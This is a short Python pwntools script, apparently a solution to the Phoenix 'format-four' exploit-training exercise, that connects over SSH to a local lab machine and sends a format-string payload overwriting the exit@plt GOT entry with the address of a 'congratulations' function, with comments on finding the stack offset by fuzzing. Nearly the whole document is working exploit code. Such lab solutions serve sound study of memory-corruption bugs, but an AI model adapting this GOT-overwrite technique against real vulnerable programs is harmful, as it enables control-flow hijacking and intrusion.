#!/usr/bin/python
from pwn import *
s = ssh(user='user', host='localhost', password='user', port=2222, timeout=3)
# s.interactive()
log.info('This program runs for a while please wait....')
'''
reference I used: https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=20&frags=wn
in gdb:
congratulations: 0x8048503
disassembling the exit@plt call in bounce()
0x80497e4 (I could only find it when the program was running)
'''
congr = 0x8048503
got = 0x80497e4
exploit = p32(got)
exploit += 'aaaa'
exploit += p32(got+2) # write in next memory block
exploit += "%" + str(0x8503-len(exploit)-10)+"x"+"%c"*10+"%n"
exploit += "%" + str(0x10804 - 0x8503) +  "x" + "%n"
'''
fuzzing the binary with "AAAA%x.%x."
and increasing the number of %xs until a 414141 is seen
meaning we have found our input on the stack
the 11th %x gives returns input AAAA back
'''
print(s['echo -e "' + exploit + '" | /opt/phoenix/i486/format-four'])
s.close()
